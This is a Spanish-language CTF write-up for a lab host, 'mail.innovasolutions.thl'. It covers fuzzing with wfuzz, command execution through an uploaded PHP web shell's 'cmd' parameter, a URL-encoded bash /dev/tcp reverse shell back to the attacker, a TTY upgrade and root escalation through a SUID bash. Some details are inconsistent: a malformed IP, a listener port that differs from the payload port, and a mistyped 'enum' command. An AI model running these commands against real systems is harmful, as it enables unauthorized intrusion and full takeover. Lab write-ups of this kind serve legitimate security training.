# **CTF: Reconocimiento, Explotación y Escalada de Privilegios**

---

## **🔍 Fase de Reconocimiento (RECON)**

### **1. Resolución de DNS**
Para acceder correctamente al dominio `mail.innovasolutions.thl`, añadimos la entrada al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
```
Agregamos la siguiente línea:
```plaintext
<IP_DEL_SERVIDOR>    mail.innovasolutions.thl
```
Guardamos y verificamos la resolución:
```bash
ping mail.innovasolutions.thl
```

---

### **2. Enumeración de la IP**
Si no se conoce la IP del servidor, se puede obtener mediante:
```bash
enum mail.innovasolutions.thl
```
o
```bash
dig mail.innovasolutions.thl
```
<img width="1920" height="1006" alt="login" src="https://github.com/user-attachments/assets/c4bc2038-74f9-4aa5-be64-1c2769f17520" />

---

## **🌐 Fase de Escaneo Web**

### **1. Fuzzing de Directorios**
Usamos `wfuzz` para buscar directorios ocultos en la web:
```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" --hc 404 --hl 2
```
- **`-w`**: Ruta del diccionario.
- **`-u`**: URL a fuzzear.
- **`--hc 404`**: Oculta respuestas con código 404.

**Resultado encontrado**:
- `/uploads` (Tamaño de respuesta: **338 bytes**).

---
<img width="1920" height="1003" alt="uploads" src="https://github.com/user-attachments/assets/a8135172-601f-46cc-8edc-00284f454da5" />

## **💻 Fase de Explotación (RCE - Remote Code Execution)**

### **1. Identificación del Parámetro Vulnerable**
Probamos si el archivo `/uploads/foto.png.php` permite ejecución de comandos:
```bash
curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id"
```
**Respuesta esperada**: Código `200` con salida del comando `id`.
<img width="1920" height="1006" alt="id" src="https://github.com/user-attachments/assets/98ad6792-114a-4a13-b317-5490186fb587" />

### **2. Fuzzing del Parámetro `cmd`**
Usamos `wfuzz` para encontrar parámetros ejecutables:
```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2.3-medium.txt -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" --hc 404 --hl 2
```
**Resultado**:
```plaintext
000005340:   200        3121 L   25664 W    677615 Ch   "cmd"
```
✅ **Parámetro vulnerable encontrado**: `cmd`.

---

### **3. Obtención de Reverse Shell**
#### **🔹 Configuración del Listener**
En la máquina atacante:
```bash
sudo nc -nlvp 443
```
#### **🔹 Ejecución del One-Liner**
Desde el navegador o `curl`:
```bash
curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.16812%2F4444%200%3E%261%27"
```
**Nota**: Se aplica **URL Encoding** para evitar errores.

<img width="1920" height="1003" alt="malrevershell" src="https://github.com/user-attachments/assets/3812aec6-d4d4-486b-bfd2-cdfcbb197dc5" />
<img width="1920" height="996" alt="URLEncode" src="https://github.com/user-attachments/assets/ef58c6ca-ef49-4416-b856-cf048ba11469" />


---

### **4. Tratamiento de la TTY**
Una vez obtenida la shell, mejoramos la interacción:
```bash
script /dev/null -c bash
```
**Ctrl + Z** para suspender el proceso.

En la terminal local:
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## **🚀 Fase de Escalada de Privilegios**

### **1. Verificación de Permisos SUID**
```bash
find / -perm -4000 -type f 2>/dev/null 
```
**Resultado**:
```plaintext

/usr/local/bin/get-report
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign 
...
/usr/bin/bash
```
✅ **Binario vulnerable**: `/usr/bin/bash`.

### **2. Explotación con Bash SUID**
```bash
/bin/bash -p
```
**Resultado**:
```bash
bash-5.2# whoami
root
```
🎉 **Acceso como root obtenido**.

### **3. Lectura de la Flag**
```bash
cd /root
ls
cat root.txt
```

---

## **📌 Resumen Final**
| **Fase**               | **Acción**                                                                 |
|------------------------|---------------------------------------------------------------------------|
| **Reconocimiento**     | Resolución DNS, escaneo de puertos y directorios.                        |
| **Explotación**        | RCE mediante parámetro `cmd` en `/uploads/foto.png.php`.               |
| **Escalada**           | Uso de `/bin/bash -p` para obtener privilegios de root.                 |

✅ **CTF Completado con éxito**. 🚩
